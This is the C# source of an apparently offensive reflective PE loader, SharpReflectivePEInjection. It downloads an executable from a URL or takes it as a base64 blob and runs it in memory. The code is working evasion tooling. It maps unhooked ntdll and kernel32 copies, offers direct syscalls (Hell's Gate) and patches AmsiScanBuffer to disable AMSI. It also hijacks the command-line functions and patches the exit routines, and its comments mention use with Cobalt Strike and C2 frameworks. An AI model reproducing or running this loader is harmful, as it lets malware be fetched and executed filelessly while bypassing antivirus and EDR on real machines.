/*
Dynamic PELoader for x86 and x64  
*/

using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Generic;
using static DInvoke.Data.PE;
using static DInvoke.DynamicInvoke.Generic;
using DInvoke.ManualMap;
using System.Net;
using System.Linq;


void print(object input) { Console.WriteLine(input); }
void exit() { Environment.Exit(0); }

byte[] unpacked = new byte[] { };

string url = null;
string Args = "";
string PE_b64 = null;
bool PatchExitProcs = false;
bool useSysCalls = false;

void ParseCLIArguments() // a DYI Parser XD
{
    void DisplayArgHelp()
    {
        Console.WriteLine("\n-url,-u         url to the binary to download");
        Console.WriteLine("\n-Args,-args,-a  Arguments to be passed to Exe [Optional]");
        Console.WriteLine("\n-b64PE          pass the entire PE as B64 encoded blob (if you are a mad person)");
        Console.WriteLine("\n-patch_exit     Patch CorExit and ExitProcess to ExitThread [you know what is it if you need it XD]");
        Console.WriteLine("\n-syscalls       Instead of Mapping ntdll, will use dynamic syscalls [Hell's Gate Technique]");
        Console.WriteLine("\n-help           Display this help screen.");
        Console.WriteLine("\n\nusage: .\\SharpReflectivePEInjection.exe -url http://10.10.10.10/exe.exe [Optional: -Args \"<EXE_ARGS>\"]");
        Console.WriteLine("usage: .\\SharpReflectivePEInjection.exe -b64PE <BASE64 PE_BLOB> [Optional: -Args \" <EXE_ARGS>\"]");
    }

    if (args.Length == 0) { DisplayArgHelp(); Environment.Exit(0); }

    for (int arg = 0; arg < args.Length; arg++)
    {
        if (args[arg] == "-url" || args[arg] == "-u") { url = args[arg + 1]; }
        if (args[arg] == "-Args" || args[arg] == "-args" || args[arg] == "-a") { Args = args[arg + 1]; }
        if (args[arg] == "-b64PE") { PE_b64 = args[arg + 1]; }
        if (args[arg] == "-syscalls") { useSysCalls = true; }
        if (args[arg] == "-patch_exit") { PatchExitProcs = true; }
        if (args[arg] == "-help" || args[arg] == "-h" || args[arg] == "--help") { DisplayArgHelp(); Environment.Exit(0); }

    }
}

ParseCLIArguments();

if (string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(PE_b64))
{
    unpacked = Convert.FromBase64String(PE_b64);
}
if (string.IsNullOrEmpty(PE_b64) && !string.IsNullOrEmpty(url))
{
    using (WebClient downloadPE = new WebClient())
    {
        Console.WriteLine($"[*] Downloading PE from {url}");
        unpacked = downloadPE.DownloadData(url);


    }
}

if (string.IsNullOrEmpty(url) && string.IsNullOrEmpty(PE_b64))
{
    print("usage: .\\PELoader.exe --url http://10.10.10.10/exe.exe [Optional: --Args \"<EXE_ARGS>\"]");
    print("usage: .\\PELoader.exe --b64PE <BASE64 PE_BLOB> [Optional: --Args \"<EXE_ARGS>\"]");

    exit();
}

// mapping DLLs
PE_MANUAL_MAP ntdll = new();
if (!useSysCalls)
{
    ntdll = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
    print("[*] Mapped a clean version of ntdll (no hooks here)");
}
else { print("[*] using SysCalls, Will Not Map ntdll"); }

PE_MANUAL_MAP kernel32 = Map.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
print("[*] Mapped a clean version of kernel32"); // can not resolve IAT without it


// all functions defined in this section are not hooked
// NtAllocate
IntPtr ntva_ptr;
if (useSysCalls) { ntva_ptr = GetSyscallStub("NtAllocateVirtualMemory"); } else { ntva_ptr = GetExportAddress(ntdll.ModuleBase, "NtAllocateVirtualMemory"); }
NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemory>(ntva_ptr);
//

//NtProtect (the only way i was able to get it to work)
IntPtr ntvp_ptr;
if (useSysCalls) { ntvp_ptr = GetSyscallStub("NtProtectVirtualMemory"); } else { ntvp_ptr = GetExportAddress(ntdll.ModuleBase, "NtProtectVirtualMemory"); }
object NtProtectVirtualMemory(IntPtr pHandle, IntPtr Address, IntPtr NtSize, uint AccessMask, uint OldProtection)
{
    object[] NtVPArgs = { pHandle, Address, NtSize, AccessMask, OldProtection };
    return DynamicFunctionInvoke(ntvp_ptr, typeof(NtProtectVirtualMemory), ref NtVPArgs);
}
//

// NtFree
IntPtr ntvf_ptr;
if (useSysCalls) { ntvf_ptr = GetSyscallStub("NtFreeVirtualMemory"); } else { ntvf_ptr = GetExportAddress(ntdll.ModuleBase, "NtFreeVirtualMemory"); }
NtFreeVirtualMemory NtFreeVirtualMemory = Marshal.GetDelegateForFunctionPointer<NtFreeVirtualMemory>(ntvf_ptr);
//

// NtCreateThreadEx
IntPtr ntct_ptr;
if (useSysCalls) { ntct_ptr = GetSyscallStub("NtCreateThreadEx"); } else { ntct_ptr = GetExportAddress(ntdll.ModuleBase, "NtCreateThreadEx"); }
NtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer<NtCreateThreadEx>(ntct_ptr);
//

// NtClose
IntPtr ntc;
if (useSysCalls) { ntc = GetSyscallStub("NtClose"); } else { ntc = GetExportAddress(ntdll.ModuleBase, "NtClose"); }
NtClose NtClose = Marshal.GetDelegateForFunctionPointer<NtClose>(ntc);
//

//NtWaitForSingleObject
IntPtr NtWait; // direct syscall made easy XD, i fuckin love D/Invoke
if (useSysCalls) { NtWait = GetSyscallStub("NtWaitForSingleObject"); } else { NtWait = GetExportAddress(ntdll.ModuleBase, "NtWaitForSingleObject"); }
NtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer<NtWaitForSingleObject>(NtWait);
//


// VitualProtect (leaving this here in case i need it) 
//IntPtr VP = GetExportAddress(kernel32.ModuleBase, "VirtualProtect");
//VirtualProtect VirtualProtect = Marshal.GetDelegateForFunctionPointer<VirtualProtect>(VP);

//

// GetProcAddress and LoadLibrary (i may be stupid, but fixing the IAT won't work without those two)
// best we could do is hide them from IAT and use unhooked versions of them
IntPtr getprocaddrr_ptr = GetExportAddress(kernel32.ModuleBase, "GetProcAddress");
IntPtr loadlib_ptr = GetExportAddress(kernel32.ModuleBase, "LoadLibraryA");
IntPtr freelib_ptr = GetExportAddress(kernel32.ModuleBase, "FreeLibrary");

GetProcAddr GetFuncAddress = Marshal.GetDelegateForFunctionPointer<GetProcAddr>(getprocaddrr_ptr);
LoadDll LoadDLL = Marshal.GetDelegateForFunctionPointer<LoadDll>(loadlib_ptr);
UnLoadDll UnLoadDLL = Marshal.GetDelegateForFunctionPointer<UnLoadDll>(freelib_ptr);

//

// constants
const uint MEM_COMMIT = 0x1000;
const uint PAGE_EXECUTE_READWRITE = 0x40;
const uint PAGE_EXECUTEREAD = 0x20;
const uint PAGE_EXECUTE = 0x10;
const uint PAGE_READONLY = 0x02;
const uint PAGE_READWRITE = 0x04;
const uint THREAD_ALL_ACCESS = 0x1FFFFF;
//


void AmziPatcher()
{ // patching AMSI

    try
    {
        uint OldProtection = 0;

        IntPtr lib = LoadDLL("amsi.dll");
        if (lib == IntPtr.Zero) { print("[-] Couldn't find (amsi.dll), skipping AMSI"); }

        IntPtr func = GetExportAddress(lib, "AmsiScanBuffer");

        // return arch appropriat patch, patch from rasta mouse (AmsiBypass.cs)
        byte[] patch = IntPtr.Size == 8 ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        IntPtr NtPatchSize = new IntPtr(patch.Length);

        _ = NtProtectVirtualMemory(new IntPtr(-1),  func, NtPatchSize, PAGE_READWRITE, OldProtection);

        Marshal.Copy(patch, 0, func, patch.Length);
        print("[*] Patched AMSI!");
        _ = NtProtectVirtualMemory(new IntPtr(-1), func, NtPatchSize, OldProtection, OldProtection);
    }
    catch {/* pokemon */}

}
AmziPatcher();

IMAGE_DOS_HEADER dosHeader = new();
IMAGE_OPTIONAL_HEADER64 OptionalHeader64 = new();
IMAGE_OPTIONAL_HEADER32 OptionalHeader32 = new();
IMAGE_FILE_HEADER FileHeader = new();
IMAGE_SECTION_HEADER[] ImageSectionHeaders;
bool Is32bitPE = false;



// CaseySmith's PELoader Constructor, but modified to DInvoke
using (MemoryStream stream = new MemoryStream(unpacked, 0, unpacked.Length))
{
    BinaryReader reader = new BinaryReader(stream);
    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

    // Add 4 bytes to the offset
    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

    UInt32 ntHeadersSignature = reader.ReadUInt32();
    FileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);

    UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
    bool Is32BitHeader = (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;

    if (Is32BitHeader)
    {
        OptionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
        Is32bitPE = true;
    }
    else
    {
        OptionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
    }

    ImageSectionHeaders = new IMAGE_SECTION_HEADER[FileHeader.NumberOfSections];
    for (int headerNo = 0; headerNo < ImageSectionHeaders.Length; ++headerNo)
    {
        ImageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
    }

    // after populating close and dispose all memory resources of BinaryReader
    reader.Dispose();
    reader.Close();



}
static T FromBinaryReader<T>(BinaryReader reader) // CaseySmith's PELoader FromBinaryReader Method
{
    // Read in a byte array
    byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

    // Pin the managed memory while, copy it out the data, then unpin it
    GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
    handle.Free();

    return theStructure;
}

if (Is32bitPE)
{

    print("[*] Loading 32-bit PE, x86 memory layout will apply");
}
else
{
    print("[*] Loading 64-bit PE, x64 memory layout will apply");
}


uint SizeOfImage = Is32bitPE == true ? OptionalHeader32.SizeOfImage : OptionalHeader64.SizeOfImage;
IntPtr NtSizeOfImage = new IntPtr(SizeOfImage);
IntPtr CurrentProcessHandle = (IntPtr)(-1);

IntPtr codebase = IntPtr.Zero;

NtAllocateVirtualMemory((IntPtr)(-1), ref codebase, IntPtr.Zero, ref NtSizeOfImage, MEM_COMMIT, PAGE_READWRITE);




// Copy Sections
for (int SectionIndex = 0; SectionIndex < FileHeader.NumberOfSections; SectionIndex++)
{
    // this is the VA of the each section which should be used as a start addres to where to allocate memory and copy each
    // section, using NTDLL, this variable holds the base address and when NTVA is called it gets filled with the allocated mem
    // and then we copy to it with Marshal.Copy
    IntPtr SectionAddress = IntPtr.Add(codebase, (int)ImageSectionHeaders[SectionIndex].VirtualAddress);
    uint SectionSize = ImageSectionHeaders[SectionIndex].SizeOfRawData;
    IntPtr NtSectionSize = new IntPtr(SectionSize);
    if (SectionSize != 0)
    {
        NtAllocateVirtualMemory(CurrentProcessHandle, ref SectionAddress, IntPtr.Zero, ref NtSectionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(unpacked, (int)ImageSectionHeaders[SectionIndex].PointerToRawData, SectionAddress, (int)SectionSize);
    }
    else continue;
}
print("[*] Mapped Sections"); // if there is any errors its mostly comming from here, its not always DNS, its always Relocations :\



// relocations

var ImageBase = Is32bitPE == true ? OptionalHeader32.ImageBase : OptionalHeader64.ImageBase;
var delta = Is32bitPE == true ? codebase.ToInt32() - (int)ImageBase : codebase.ToInt64() - (long)ImageBase;
var BaseRelocationRVA = Is32bitPE == true ? OptionalHeader32.BaseRelocationTable.VirtualAddress : OptionalHeader64.BaseRelocationTable.VirtualAddress;


IntPtr RelocationTablePtr = IntPtr.Add(codebase, (int)BaseRelocationRVA);
IMAGE_BASE_RELOCATION ImageBaseRelocation = new();
ImageBaseRelocation = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(RelocationTablePtr);
int ImageSizeOfBaseRelocation = Marshal.SizeOf<IMAGE_BASE_RELOCATION>();
int SizeOfRelocationBlock = (int)ImageBaseRelocation.SizeOfBlock;
IntPtr pRelocationTablePtr = RelocationTablePtr; // using a pointer to a pointer ??? --__('')__--

while (true)
{
    IMAGE_BASE_RELOCATION ImageBaseRelocation2 = new();
    IntPtr NextRelocationBlock = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    ImageBaseRelocation2 = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(NextRelocationBlock);

    IntPtr RelocationBlockAddress = IntPtr.Add(codebase, (int)ImageBaseRelocation.VirtualAdress);
    int RelocationEntriesinBlock = (int)((ImageBaseRelocation.SizeOfBlock - ImageSizeOfBaseRelocation) / 2);

    for (int i = 0; i < RelocationEntriesinBlock; i++)
    {
        UInt16 RelocationEntry = (UInt16)Marshal.ReadInt16(pRelocationTablePtr, ImageSizeOfBaseRelocation + (2 * i));
        UInt16 type = (UInt16)(RelocationEntry >> 12);
        UInt16 AddressToFix = (UInt16)(RelocationEntry & 0xfff);
        switch (type)
        {
            case 0x0:
                break;
            case 0xA: // PE32+
                IntPtr PatchAddress = IntPtr.Add(RelocationBlockAddress, AddressToFix);
                long OriginalAddress = Marshal.ReadInt64(PatchAddress);
                Marshal.WriteInt64(PatchAddress, OriginalAddress + delta);
                break;

            case 0x3: // PE32
                IntPtr PatchAddress32 = IntPtr.Add(RelocationBlockAddress, AddressToFix);
                int OriginalAddress32 = Marshal.ReadInt32(PatchAddress32);
                Marshal.WriteInt32(PatchAddress32, OriginalAddress32 + (int)delta);
                break;
        }

    }
    pRelocationTablePtr = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    SizeOfRelocationBlock += (int)ImageBaseRelocation2.SizeOfBlock;
    ImageBaseRelocation = ImageBaseRelocation2;

    if (ImageBaseRelocation2.SizeOfBlock == 0) break;
}
print("[*] Performed Relocations");



// Resolving Imports, Dancing in the IAT 


int IMBORT_DIRECTORY_TABLE_ENTRY_LENGTH = 20;
int IDT_IAT_OFFSET = 16;
int DLL_NAME_RVA_OFFSET = 12;
int IMPORT_LOOKUP_TABLE_HINT = 2;

var IMPORT_TABLE_SIZE = Is32bitPE == true ? (int)OptionalHeader32.ImportTable.Size : (long)OptionalHeader64.ImportTable.Size;
int ImportTableRVA = Is32bitPE == true ? (int)OptionalHeader32.ImportTable.VirtualAddress : (int)OptionalHeader64.ImportTable.VirtualAddress;

int SizeOfImportDescriptorStruct = Marshal.SizeOf<DInvoke.Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR>();
var NumberOfDlls = IMPORT_TABLE_SIZE / SizeOfImportDescriptorStruct;

IntPtr pIDT = IntPtr.Add(codebase, ImportTableRVA);

for (int DllIndex = 0; DllIndex < NumberOfDlls; DllIndex++)
{
    IntPtr pImageImportDescriptor = IntPtr.Add(pIDT, IMBORT_DIRECTORY_TABLE_ENTRY_LENGTH * DllIndex);
    IntPtr dllNameRva = IntPtr.Add(pImageImportDescriptor, DLL_NAME_RVA_OFFSET);
    IntPtr dllNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(dllNameRva));
    string DllName = Marshal.PtrToStringAnsi(dllNamePtr);
    if (string.IsNullOrEmpty(DllName)) { break; }
    IntPtr Handle2Dll = LoadDLL(DllName);

    int IAT_RVA = Marshal.ReadInt32(pImageImportDescriptor, IDT_IAT_OFFSET);
    IntPtr IATPtr = IntPtr.Add(codebase, IAT_RVA);

    while (true)
    {
        IntPtr DllFuncNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(IATPtr) + IMPORT_LOOKUP_TABLE_HINT);
        string DllFuncName = Marshal.PtrToStringAnsi(DllFuncNamePtr);
        if (string.IsNullOrEmpty(DllFuncName)) { break; } // sanity check
        //print($"{DllName} -> {DllFuncName}");
        IntPtr FuncAddress = GetFuncAddress(Handle2Dll, DllFuncName);

        var IntFunctionAddress = Is32bitPE == true ? FuncAddress.ToInt32() : FuncAddress.ToInt64(); ;
        if (Is32bitPE)
        {
            Marshal.WriteInt32(IATPtr, (int)IntFunctionAddress);

        }
        else
        {
            Marshal.WriteInt64(IATPtr, (long)IntFunctionAddress);
        }

        IATPtr = IntPtr.Add(IATPtr, IntPtr.Size);
    }
    //UnLoadDLL(Handle2Dll);

}
print("[*] Loaded Dlls and Fixed Import Access Table");


// hijack (GetCommandLineA and GetCommandLineW) and beyond XD

string ExeArgs = $" {Args}"; // needs a white space prefix
if (!string.IsNullOrEmpty(Args)) { print($"[*] Passing [{Args}] to EXE"); }
void PatchGetCommandLineX() // reference Invoke-ReflectivePEinjection.ps1, Lines: 1966 - 2125
{
    int PtrSize = IntPtr.Size; // 32Bit=4, 64bit=8

    IntPtr hKernelBase = GetPebLdrModuleEntry("kernelbase.dll");

    IntPtr CLIWptr = Marshal.StringToHGlobalUni(ExeArgs); // unicode string
    IntPtr CLIAptr = Marshal.StringToHGlobalAnsi(ExeArgs); // ansi/ascii --__("")__-- string 

    // GetCommandLineA address from kernelbase.dll
    IntPtr GetCommandLineAaddr = GetExportAddress(hKernelBase, "GetCommandLineA");
    
    // GetCommandLineW address from kernelbase.dll
    IntPtr GetCommandLineWaddr = GetExportAddress(hKernelBase, "GetCommandLineW");

    byte[] AssemblyPatch;

    if (!Is32bitPE)
    {
     
        AssemblyPatch = new byte[] { 0x48, 0xb8 }; // MOV REX.W // prepares the cpu for x64 instructions
    }
    else
    {
        AssemblyPatch = new byte[] { 0xb8 }; // MOV, if x86
    }

    byte[] RET = { 0xc3 };

    uint TotalSize;
    TotalSize = (uint)(AssemblyPatch.Length + PtrSize + RET.Length);

    IntPtr NtTotalSize = new IntPtr(TotalSize);
    uint OldProtection = 0;

    byte[] Nulls = new byte[TotalSize];
    for (int i = 0; i < Nulls.Length; i++) { Nulls[i] += 0x00; }

    // overwriting GetCommandLineA

    NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineAaddr, NtTotalSize, PAGE_READWRITE, OldProtection);

    Marshal.Copy(Nulls.ToArray(), 0, GetCommandLineAaddr, Nulls.Length);

    Marshal.Copy(AssemblyPatch, 0, GetCommandLineAaddr, AssemblyPatch.Length);
    GetCommandLineAaddr = IntPtr.Add(GetCommandLineAaddr, AssemblyPatch.Length);
    Marshal.StructureToPtr(CLIAptr, GetCommandLineAaddr, true); // puts the CLIAptr string in GetCommandLineAptr memory address
    GetCommandLineAaddr = IntPtr.Add(GetCommandLineAaddr, PtrSize);
    Marshal.Copy(RET, 0, GetCommandLineAaddr, RET.Length);

    NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineAaddr, NtTotalSize, PAGE_EXECUTEREAD, OldProtection);

    // overwriting GetCommandLineW

    NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineWaddr, NtTotalSize, PAGE_READWRITE, OldProtection);

    Marshal.Copy(Nulls.ToArray(), 0, GetCommandLineWaddr, Nulls.Length);

    Marshal.Copy(AssemblyPatch, 0, GetCommandLineWaddr, AssemblyPatch.Length);
    GetCommandLineWaddr = IntPtr.Add(GetCommandLineWaddr, AssemblyPatch.Length);
    Marshal.StructureToPtr(CLIWptr, GetCommandLineWaddr, true); // puts the CLIAptr string in GetCommandLineAptr memory address
    GetCommandLineWaddr = IntPtr.Add(GetCommandLineWaddr, PtrSize);
    Marshal.Copy(RET, 0, GetCommandLineWaddr, RET.Length);

    NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineWaddr, NtTotalSize, PAGE_EXECUTEREAD, OldProtection);

    UnLoadDLL(hKernelBase);
    NtClose(hKernelBase);
    Marshal.FreeHGlobal(CLIAptr);
    Marshal.FreeHGlobal(CLIWptr);

}

void Patch_xcmdln() // adding support to Native C/C++ args like (args[0]) to make it fully compatible with anything
{

    uint OldProtect;
    uint NtOld = 0;

    IntPtr hDll = GetPebLdrModuleEntry("msvcrt.dll"); // without using DInvoke and Native C# structures to acces the PEB it won't work
    if (hDll == IntPtr.Zero) { print("[-] could not load msvcrt.dll, non windows api args will not be patched"); }
    IntPtr Wcmdlineaddr = GetExportAddress(hDll, "_wcmdln");
    IntPtr Acmdlineaddr = GetExportAddress(hDll, "_acmdln");

    IntPtr NewPtra_cmdln = Marshal.StringToHGlobalAnsi(ExeArgs);
    IntPtr NewPtrw_cmdln = Marshal.StringToHGlobalAnsi(ExeArgs);

    IntPtr NtSize = new IntPtr(IntPtr.Size);

    // patch a_cmdln

    NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, PAGE_READWRITE, NtOld);
    Marshal.StructureToPtr(NewPtra_cmdln, Acmdlineaddr, true);
    NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, NtOld, NtOld);

    // patch W_cmdln

    NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, PAGE_READWRITE, NtOld);
    Marshal.StructureToPtr(NewPtrw_cmdln, Wcmdlineaddr, true);
    NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, NtOld, NtOld);


    UnLoadDLL(hDll);
    NtClose(hDll);

    Marshal.FreeHGlobal(NewPtra_cmdln);
    Marshal.FreeHGlobal(NewPtrw_cmdln);

}



// patching core exit process, not important when used with Cobalt hence it does the disgusting act of creating a
// sacrifial process anyways or any similar C2, but if the program is used from a PS or a cmd.exe it'll crash exit the whole shell
// and thats not good XD
void PatchExit() // guess what, YEP referencing Invoke-ReflectivePEInjection.ps1 again, these people are awesome!!!
{
    print("[*] Patching Exit mechanism to ExitThread");

    var ExitFunctions = new List<IntPtr>();

    IntPtr hMscoree = GetPebLdrModuleEntry("mscoree.dll");
    if (hMscoree == IntPtr.Zero) { print("did not find mscoree.dll"); }
    IntPtr hkernel32 = GetPebLdrModuleEntry("kernel32.dll");
    if (hkernel32 == IntPtr.Zero) { print("did not find kernel32.dll, WTF kind of windows doesn't have kernel32"); }

    IntPtr CorExitProcaddr = GetExportAddress(hMscoree, "CorExitProcess");
    IntPtr ExitProcAddr = GetExportAddress(hkernel32, "ExitProcess");
    if (ExitProcAddr == IntPtr.Zero) { print("did not find ExitProcess"); }



    ExitFunctions.Add(CorExitProcaddr);
    ExitFunctions.Add(ExitProcAddr);


    uint OldProtection = 0;

    foreach (IntPtr Function in ExitFunctions)
    {

        IntPtr FunctionAddr = Function;
        byte[] AssemblyPatch;
        byte[] AssemblyPatch2;

        if (Is32bitPE) // x86 assembly to patch
        {
            AssemblyPatch = new byte[] { 0xbb };
            AssemblyPatch2 = new byte[] { 0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb };
        }
        else // guess it 
        {
            AssemblyPatch = new byte[] { 0x48, 0xbb };
            AssemblyPatch2 = new byte[] { 0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb };

        }

        byte[] CALL_MODRM = { 0xff, 0xd3 };

        int TotalSize = AssemblyPatch.Length + IntPtr.Size + AssemblyPatch2.Length + IntPtr.Size + CALL_MODRM.Length;
        IntPtr NtTotalSize = new IntPtr(TotalSize);

        IntPtr DonyBytePtr = Marshal.AllocHGlobal(1);

        IntPtr ExitThreadAddr = GetExportAddress(hkernel32, "ExitThread");

        _ = NtProtectVirtualMemory(new IntPtr(-1), FunctionAddr, NtTotalSize, PAGE_READWRITE, OldProtection);

        Marshal.Copy(AssemblyPatch, 0, FunctionAddr, AssemblyPatch.Length);
        FunctionAddr = IntPtr.Add(FunctionAddr, AssemblyPatch.Length);
        Marshal.StructureToPtr(DonyBytePtr, FunctionAddr, false);

        FunctionAddr = IntPtr.Add(FunctionAddr, IntPtr.Size);
        Marshal.Copy(AssemblyPatch2, 0, FunctionAddr, AssemblyPatch2.Length);
        FunctionAddr = IntPtr.Add(FunctionAddr, AssemblyPatch2.Length);
        Marshal.StructureToPtr(ExitThreadAddr, FunctionAddr, false);

        FunctionAddr = IntPtr.Add(FunctionAddr, IntPtr.Size);
        Marshal.Copy(CALL_MODRM, 0, FunctionAddr, CALL_MODRM.Length);

        _= NtProtectVirtualMemory(new IntPtr(-1), FunctionAddr, NtTotalSize, PAGE_EXECUTEREAD, OldProtection);


        Marshal.FreeHGlobal(DonyBytePtr);
    }

    UnLoadDLL(hMscoree);
    UnLoadDLL(hkernel32);
    NtClose(hMscoree);
    NtClose(hkernel32);


}



void CleanOnExitEvent() // reason behind is to properly clean the memory on CTRL-C press
{
    uint old = 0;
    IntPtr ReleaseAllMemory = IntPtr.Zero;

    uint p = (uint)NtProtectVirtualMemory(new IntPtr(-1), codebase, NtSizeOfImage, PAGE_READWRITE, old);
    if (p != 0) { print("[-] Error in changing Memory Protection for Cleanup"); }

    byte[] zeroes = new byte[SizeOfImage];
    for (var i = 0; i < zeroes.Length; i++)
    {
        zeroes[i] = 0x00;
    }

    Marshal.Copy(zeroes.ToArray(), 0, codebase, (int)SizeOfImage);

    print("\n[*] Zeroed-Out all the memory");
    uint f = NtFreeVirtualMemory(new IntPtr(-1), ref codebase, ref ReleaseAllMemory, 0x00008000); // decommit and release at the same time
    if (f != 0) { print("[-] Error in Freeing the Allocated Memory for Cleanup"); }
    print("[*] Freed all allocated memory");
    if (!useSysCalls) { Map.FreeModule(ntdll); }
    Map.FreeModule(kernel32);
    print("[*] Freed Mapped DLLs");
    Environment.Exit(0);

}


void ExitEvent()
{
    Console.CancelKeyPress += (sender, eArgs) => { // on exit , clean up everything
        CleanOnExitEvent();
        Environment.Exit(0);

    };
}



PatchGetCommandLineX();
Patch_xcmdln();
if (PatchExitProcs) { PatchExit(); }
ExitEvent();
print("[*] Executing loaded PE");



int AddressOfEntryPoint = Is32bitPE == true ? (int)OptionalHeader32.AddressOfEntryPoint : (int)OptionalHeader64.AddressOfEntryPoint;
IntPtr threadStart = IntPtr.Add(codebase, AddressOfEntryPoint);
IntPtr hThread = IntPtr.Zero;
NtCreateThreadEx(ref hThread, THREAD_ALL_ACCESS, IntPtr.Zero, new IntPtr(-1), threadStart, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

NtWaitForSingleObject(hThread, false, IntPtr.Zero); // this is a syscall casted to work like a function XD

CleanOnExitEvent(); // most of the time its not reachable but it is useful when its reachable 






// here starts the function Delegates definitions
// the reason is to use with D/Invoke and Manual Mapping to get a an unhooked version of the dll and its functions
/*
example use:

DInvoke.Data.PE.PE_MANUAL_MAP ntdll = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
IntPtr ntva_ptr = GetExportAddress(ntdll.ModuleBase, "NtVirtualAlloc");
NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemory>(ntva_ptr)

this insures that NtAllocateVirtualMemory is not hooked

- any function called from a mapped kernel32 will not be hooked, but its corresponding kernelbase, ntdll call will be
    - not really critical hence all "Malicious" looking functions are called directly from a clean ntdll map
*/

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtAllocateVirtualMemory(
    IntPtr processHandle, // pseudo handle to the current process (IntPtr)(-1)
    ref IntPtr allocatedAddress, // NtAllocateVirtualMemory will fill up the parameter with the allocated memory 
    IntPtr zeroBits, // ZERO IntPtr.Zero
    ref IntPtr regionSize, // (IntPtr)OptionalHeader.SizeOfImage
    uint allocationType,
    uint memoryProtection
);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr NtClose(IntPtr HANDLE);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtProtectVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    ref IntPtr regionSize,
    uint newProtect,
    ref uint oldProtect
);



[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtFreeVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    ref IntPtr regionSize,
    uint freeType
);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtCreateThreadEx(
    ref IntPtr threadHandle,
    uint desiredAccess,
    IntPtr objectAttributes,
    IntPtr processHandle,
    IntPtr startAddress,
    IntPtr parameter,
    bool createSuspended,
    int stackZeroBits,
    int sizeOfStack,
    int maximumStackSize,
    IntPtr attributeList
);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpFlOldProtect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr NtWaitForSingleObject(IntPtr HANDLE, bool BOOL, IntPtr Handle);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr LoadDll(string lpFileName);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr UnLoadDll(IntPtr lpHandle);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr GetProcAddr(IntPtr hModule, string procName);